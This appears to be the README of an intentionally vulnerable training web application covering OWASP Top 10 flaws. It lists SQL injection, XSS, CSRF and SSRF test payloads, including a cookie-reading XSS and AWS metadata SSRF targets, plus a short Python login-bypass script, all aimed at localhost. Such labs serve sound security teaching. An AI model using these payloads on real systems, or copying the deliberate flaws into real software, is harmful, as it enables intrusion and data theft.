# OWASP Top 10 Vulnerability Lab

**A professional, intentionally vulnerable web application for learning OWASP Top 10 vulnerabilities and penetration testing techniques.**

## ⚠️ Disclaimer

**THIS IS FOR EDUCATIONAL PURPOSES ONLY!** 

This application is intentionally vulnerable and should ONLY be used in a local, isolated environment for learning security testing. Never deploy this to production or use these techniques on real websites without proper authorization.

## 🎯 Purpose

This lab is designed to help you:
- Learn OWASP Top 10 vulnerabilities hands-on
- Practice penetration testing with Burp Suite
- Understand SQL injection, XSS, CSRF, SSRF attacks
- Test broken authentication and access control
- Write exploit scripts in Python/JavaScript
- Conduct professional security assessments

## 🚀 Quick Start

### Prerequisites
- **Node.js** (v18 or higher): https://nodejs.org
- **Burp Suite** (Community/Professional): https://portswigger.net/burp
- **Modern Browser** (Chrome/Firefox recommended)

### Installation

```bash
cd owasp_top10

# Install dependencies
npm install

# Initialize database with sample data
npm run setup-db

# Start the server
npm run dev    # Development mode (auto-reload)
# OR
npm start      # Production mode
```

The application will be available at: **http://localhost:3000**

## 📚 Vulnerabilities Included

### 1. **SQL Injection** (A03:2021 - Injection)
**Locations:** `/login`, `/register`, `/search`

**Test it:**
- Login with: `admin' OR '1'='1` / `anything`
- Register with SQL payloads
- Search with: `' OR '1'='1`

### 2. **Cross-Site Scripting - XSS** (A03:2021)
**Locations:** `/reflected-xss`, `/search`

**Test it:**
- Payload: `<script>alert('XSS')</script>`
- Payload: `<img src=x onerror="alert(1)">`
- Cookie stealing attempts

### 3. **Broken Access Control** (A01:2021)
**Locations:** `/profile/:id`, `/sensitive`

**Test it:**
- Access `/profile/1`, `/profile/2`, `/profile/3`
- Check `/sensitive` endpoint
- No authorization checks!

### 4. **Cross-Site Request Forgery - CSRF** (A01:2021)
**Locations:** `/transfer`

**Test it:**
- Capture request in Burp Suite
- Generate CSRF PoC
- Create malicious HTML form

### 5. **Server-Side Request Forgery - SSRF** (A10:2021)
**Locations:** `/fetch`

**Test it:**
- Internal network: `http://127.0.0.1`
- AWS metadata: `http://169.254.169.254/`
- Port scanning: `http://localhost:22`

### 6. **Sensitive Data Exposure** (A02:2021)
**Locations:** `/sensitive`, Database

**Test it:**
- View all users' data
- Check plaintext passwords
- Examine session cookies

## 📊 Database & Data Storage

### Data Storage

All registered users and posts are stored in **THREE locations**:

1. **SQLite Database:** `db/database.sqlite` (Primary storage)
2. **JSON Export:** `data/database_export.json` (Auto-updated every 60 seconds)
3. **No public endpoints** - Data is PRIVATE and only in your local files!

### Auto-Save Feature

- ✅ Database automatically exports to JSON on server startup
- ✅ Updates every 60 seconds automatically
- ✅ Also saves immediately after new user registration
- ✅ JSON file location: `data/database_export.json`
- ✅ **NOT accessible from browser** - private file only!

### Data Structure

```json
{
  "timestamp": "ISO 8601 timestamp",
  "users": [
    {
      "id": 1,
      "username": "alice",
      "email": "alice@test.com",
      "password_hash": "alice123",
      "role": "user",
      "created_at": "2025-10-31 03:25:34"
    }
  ],
  "posts": [
    {
      "id": 1,
      "user_id": 1,
      "title": "First Post",
      "content": "Content here...",
      "created_at": "2025-10-31 03:25:34"
    }
  ]
}
```

**Note:** 
- Data is automatically saved to JSON every 60 seconds
- Also saves immediately after user registration
- JSON file is stored in `data/database_export.json` folder
- This file is **NOT accessible from browser** - only in your project folder!

## 🛠️ Burp Suite Testing

### Setup Burp Suite

1. **Configure Proxy:**
   - Proxy > Options > Add listener on port 8080
   
2. **Browser Settings:**
   - Manual proxy: localhost:8080
   - Install Burp CA certificate

3. **Testing Flow:**
   ```
   1. Spider → Discover all endpoints
   2. Active Scan → Automated vulnerability scan
   3. Manual Testing → Deep dive into findings
   4. Intruder → Fuzzing and brute forcing
   5. Repeater → Test payloads manually
   ```

## 📖 Complete Testing Guide

**See `HOW_TO_USE.txt` for:**
- Detailed vulnerability testing procedures
- Burp Suite configuration guide
- SQLmap integration
- Sample exploit scripts (Python/HTML)
- Troubleshooting tips
- Professional testing methodology

## 🧪 Test Accounts

Pre-configured accounts for testing:

| Username | Password | Role |
|----------|----------|------|
| alice | alice123 | user |
| bob | bob123 | user |
| admin | admin123 | admin |

## 🔍 Example Exploits

### SQL Injection
```python
import requests

url = "http://localhost:3000/login"
payload = "admin' OR '1'='1"

response = requests.post(url, data={
    'username': payload,
    'password': 'anything'
})

print("[+] SQL Injection:", "Success" if "Welcome" in response.text else "Failed")
```

### XSS
```javascript
fetch('/reflected-xss?name=<script>alert(document.cookie)</script>')
```

### CSRF
```html
<form action="http://localhost:3000/transfer" method="POST">
    <input name="amount" value="10000">
    <input name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

## 📁 Project Structure

```
owasp_top10/
├── server.js              # Main server with vulnerabilities
├── package.json           # Dependencies
├── seed/
│   └── seed.js           # Database initialization
├── db/
│   └── database.sqlite   # SQLite database
├── views/                # EJS templates
│   ├── login.ejs
│   ├── register.ejs
│   ├── search.ejs
│   ├── transfer.ejs
│   ├── fetch.ejs
│   └── vuln_*.ejs       # Vulnerability demo pages
├── public/
│   └── css/
│       └── style.css    # Styling
├── HOW_TO_USE.txt        # Detailed testing guide
└── README.md             # This file
```

## 🎓 Learning Path

1. **Setup**: Install and run the application
2. **Explore**: Browse all vulnerability pages
3. **Manual Testing**: Try payloads manually
4. **Burp Suite**: Use professional tools
5. **Automated**: Run scans and fuzzing
6. **Exploits**: Write your own scripts
7. **Fix**: Learn secure coding practices

## 🔐 Security Features (Intentional Bugs)

- ✅ SQL Injection through string concatenation
- ✅ No input sanitization
- ✅ Reflected XSS without encoding
- ✅ Missing CSRF tokens
- ✅ No authorization checks
- ✅ Insecure session management
- ✅ SSRF without URL validation
- ✅ Exposed sensitive data
- ✅ Weak passwords
- ✅ Error information leakage

## 🆘 Troubleshooting

**Database errors?**
```bash
rm db/database.sqlite
npm run setup-db
```

**Port in use?**
- Change PORT in `server.js`
- Or kill process: `lsof -ti:3000 | xargs kill`

**Burp not intercepting?**
- Check proxy listener enabled
- Verify browser proxy settings
- Install CA certificate
- Disable browser extensions

## 📝 Scripts

```bash
npm start          # Start production server
npm run dev        # Start with auto-reload
npm run setup-db   # Reinitialize database
```

## 🤝 Contributing

This is an educational project. Feel free to:
- Add more vulnerabilities
- Improve documentation
- Create better exploits
- Share learning resources

## ⚖️ Legal Notice

**IMPORTANT:** Testing without authorization is ILLEGAL.

- ✅ Use only in local, isolated environments
- ✅ Educational purposes only
- ❌ Never test production systems without permission
- ❌ Never attack real websites
- ✅ Follow responsible disclosure
- ✅ Get proper authorization for real pentesting

## 📚 Related Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [SQLmap User Guide](https://sqlmap.org/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [DVWA](https://github.com/digininja/DVWA)

## 🌟 Next Steps

1. Complete all vulnerability exercises in `HOW_TO_USE.txt`
2. Practice with Burp Suite Professional
3. Learn to write custom exploits
4. Study secure coding practices
5. Get certified: OSCP, CEH, or eWPT

## 📧 Support

If you encounter issues:
1. Check `HOW_TO_USE.txt` troubleshooting section
2. Review terminal logs
3. Verify all setup steps completed
4. Check Burp Suite configuration

---

**Stay Legal, Stay Ethical, Happy Hacking! 🚀**

Made for cybersecurity education and professional development.

